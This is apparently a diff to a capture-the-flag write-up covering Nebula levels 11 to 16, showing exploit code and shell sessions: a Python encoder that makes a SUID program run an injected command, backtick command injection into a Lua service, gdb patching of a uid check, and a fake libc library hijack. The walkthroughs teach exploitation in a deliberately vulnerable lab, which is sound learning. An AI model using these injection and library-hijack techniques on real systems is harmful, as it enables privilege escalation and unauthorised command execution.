@@ -186,51 +186,62 @@ $ while :; do nice -n 20 /home/flag10/flag10 /tmp/token10 127.0.0.1; done
 * Eventually we'll get the token in the second terminal: _615a2ce1-b2b5-4c76-8eed-8aa5c4015c27_. We can use it to login as flag10 user.
 
 ## Level 11
-Level 11 presents a C program that 'decrypts' an input buffer and passes the result to the system command to be executed.  The encryption algorithm is simple, but entertaining to reverse.  I've built a python script to encrypt any command, so that it will be decrypted correctly by this algorithm and executed. (The documentation is the code).
-?
-1
-2
-3
+Level 11 presents a C program that _\"decrypts\"_ an input buffer and passes the result to the `system` command to be executed.  The encryption algorithm is simple, but entertaining to reverse engineer. Before reading on, I encourage you to do the reversing and understand it! I've built a Python script to encrypt any command, so that it will be decrypted correctly by this algorithm and executed:
+```python
+# Generate initial encoded string to be decoded by level11 parser
+# e.g. : python gen.py | /home/flag11/flag11
+
+MAXINT=4294967296
+
+# command string to be obtained
+# first part can be any command
+cmd="/bin/getflag > /tmp/out11; echo " + "A" * 1024
+
+# build keys array
+key = [0 for i in range(0, len(cmd))]
+
+key[0] = len(cmd) & 0xff
+for i in range(1, len(cmd)):
+	key[i] = key[i-1] - ord(cmd[i-1])
+	if (key[i] < 0):
+		key[i] += MAXINT
+
+# build initial 'encrypted' string
+a = [0 for i in range(0, len(cmd))]
+for i in range(0, len(cmd)):
+	a[i] = ord(cmd[i]) ^ key[i]
+	# trim down to byte
+	a[i] &= 0xff
+
+print "Content-Length: " + str(len(cmd)) + "\n" + "".join([chr(i) for i in a])
+
+# verification
+for i in range (0, len(cmd)):
+	a[i] ^= key[i]
+	key[i] -= a[i]
+	#print chr(a[i])
+```
+
+And to pass the level:
+```bash
 level11@nebula:~$ python gen.py | TEMP=/tmp /home/flag11/flag11
 level11@nebula:~$ cat /tmp/out11
 You have successfully executed getflag on a target account
-Level 12
-We're informed that there's a backdoor listening on port 50001. There's a LUA script that binds the port and asks for a password, /home/flag12/flag12.lua. The vulnerability to be exploited here is in the popen() function,  that is executed with the unsanitized password as an input. We take advantage of this and slip in a command instead of the password:
-?
-1
-2
-3
-4
-5
+```
+
+## Level 12
+We're informed that there's a backdoor listening on port 50001. There's a LUA script that binds the port and asks for a password, _/home/flag12/flag12.lua_. The vulnerability to be exploited here is in the _`popen()`_ function,  that is executed with the unsanitized password as an input. We take advantage of this and slip in a command instead of the password:
+```bash
 level12@nebula:~$ nc.traditional 127.0.0.1 50001
 Password: `getflag > /tmp/flag12`
 Better luck next time
 level12@nebula:~$ cat /tmp/flag12
 You have successfully executed getflag on a target account
-Level 13
-The program to be exploited here checks if the real user id of the calling process (obtained with the getuid() call)  has a specific value and, if  the condition is true, prints the token for flag10 user. The check can be bypassed by starting the program in gdb, set a breakpoint before the comparison, and when hit, modify the user id value to be compared to the one required:
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
+```
+
+## Level 13
+The program to be exploited here checks if the real user id of the calling process (obtained with the [getuid()](http://man7.org/linux/man-pages/man2/getuid.2.html) call)  has a specific value and, if  the condition is true, prints the token for flag10 user. The check can be bypassed by starting the program in gdb, set a breakpoint before the comparison, and when hit, modify the user id value to be compared to the one required:
+```bash
 gdb /home/flag13/flag13
 (gdb) set logging on
 (gdb) disas main
@@ -251,61 +262,49 @@ $1 = 1014
 Continuing.
 Your token is b705702b-76a8-42b0-8844-3adabbe5ac58
 [Inferior 1 (process 2114) exited with code 063]
-</getuid@plt>
-Level 14
-We're presented a readable file with encrypted content, and the encryption program. We have the ability to chose arbitrary texts to be encrypted and see the corresponding cipher text (chosen plain text attack). It's simple, I won't ruin the fun of discovering how it works. With this python script, I've  'deciphered' the token:
-?
-1
-2
+```
+
+## Level 14
+We're presented a readable file with encrypted content, and the encryption program. We have the ability to chose arbitrary texts to be encrypted and see the corresponding cipher text - this is called [**_Chosen plain text attack_**](https://en.wikipedia.org/wiki/Chosen-plaintext_attack)). It's simple, I won't ruin the fun of discovering how it works. With a simple Python brute-force script:
+```python
+# Level 14 'decryptor'
+# python dec.py `cat /home/flag14/token`
+
+import sys
+
+input = sys.argv[1]
+
+out = [0 for i in range(0, len(input))]
+
+key = 0
+for i in range(0, len(input)):
+	out[i] = chr(ord(input[i]) - key)
+	key += 1
+	
+print "".join(out)
+```
+I've  'deciphered' the token:
+```
 $python dec.py `cat /home/flag14/token`
 8457c118-887c-4e40-a5a6-33a25353165
-Level 15
-This level instructs us to strace the suid binary corresponding to flag15, and links to instructions on how to compile libraries in Linux (static, shared, loadable). Doing as suggested, first thing we see is that the program tries to load libc library from a non-standard path in the world-readable /var/tmp folder:
-?
-1
+```
+
+## Level 15
+This level instructs us to [strace](http://man7.org/linux/man-pages/man1/strace.1.html) the SUID binary corresponding to `flag15`, and links to instructions on [how to compile libraries in Linux](http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html) (static, shared, loadable). Doing as suggested, first thing we see is that the program tries to load libc library from a non-standard path in the world-readable `/var/tmp` folder:
+```bash
 open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory).
-By disassembling the program in GDB, we see it's using the puts() function (from glibc) to print some instructions on screen.
-?
-1
-2
-3
-4
-5
+```
+
+By disassembling the program in GDB, we see it's using the [puts() function](http://www.cplusplus.com/reference/cstdio/puts/) (from glibc) to print some instructions on screen.
+```bash
 gdb /home/flag15/flag15
 (gdb) disas main
-. . .
+. . .https://github.com/livz/nebula-x/tree/master/level15
 0x08048340 <+16>:    call   0x8048300 <puts@plt>
-</puts@plt>
-So we will create a fake library in the path above, where the program searches for libraries, containing this puts() function, but with our code. We we'll also need a Makefile for easier compilation and a version script file. It is important to link in libc static library when compiling our fake library, to get access to system calls (-Bstatic, -staic options from below). All the files mentioned are also here. The fake library source code:
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
+```
+
+So we will create a fake library in the path above, where the program searches for libraries, containing this puts() function, but with our code. We we'll also need a _`Makefile`_ for easier compilation and a _`version script`_ file. **_It is important to link in libc static library when compiling our fake library_**, to get access to system calls (**-Bstatic, -static** options from below). All the files mentioned are also [here](https://github.com/livz/nebula-x/tree/master/level15). The fake library source code:
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys syscall.h="">
@@ -333,23 +332,9 @@ int __libc_start_main(int (*main) (int, char **, char **),
   
  return 0;
 }
-</sys></stdlib.h></stdio.h>
-And the Makefile: 
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
+```
+And the `Makefile`: 
+```bash
 FAKELIB=/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6
 FAKEOBJ=libc.o
 FAKESRC=libc.c
@@ -364,21 +349,18 @@ clean:
  
 cleanall:
  rm *.o *.c $(VER_SCRIPT) 
+```
+
 Putting them together, we can execute any command, with flag15 privileges:
-?
-1
-2
-3
-4
-5
-6
+```bash
 level15@nebula:~$ mkdir -p /var/tmp/flag15/tls/i686/sse2/cmov
 level15@nebula:~$ /home/flag15/flag15
 Segmentation fault
 level15@nebula:~$ cat /tmp/out15
 You have successfully executed getflag on a target account
-level15@nebula:~$
-Level 16
+```
+
+## Level 16
 We have another vulnerable Perl script listening on port 1616. This script forms a command to be executed based on unsanitized user input - $username variable:
 ?
 1
